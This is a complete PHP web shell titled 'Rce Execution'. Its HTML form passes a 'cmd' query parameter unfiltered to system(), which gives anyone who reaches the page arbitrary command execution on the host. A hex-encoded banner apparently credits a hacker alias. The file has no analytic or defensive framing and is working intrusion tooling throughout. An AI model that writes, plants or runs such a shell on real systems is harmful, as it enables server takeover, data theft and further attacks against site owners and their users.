
<html>
<title>Rce Execution</title>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php echo"\x41u\x74o\x20\x50\x61\x79L\x6fa\x64\x20R\x63e\x20\x7c\x20u\x64u\x2eH\x2dC\x6b\x33\x72";
 if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>

<?php
?>
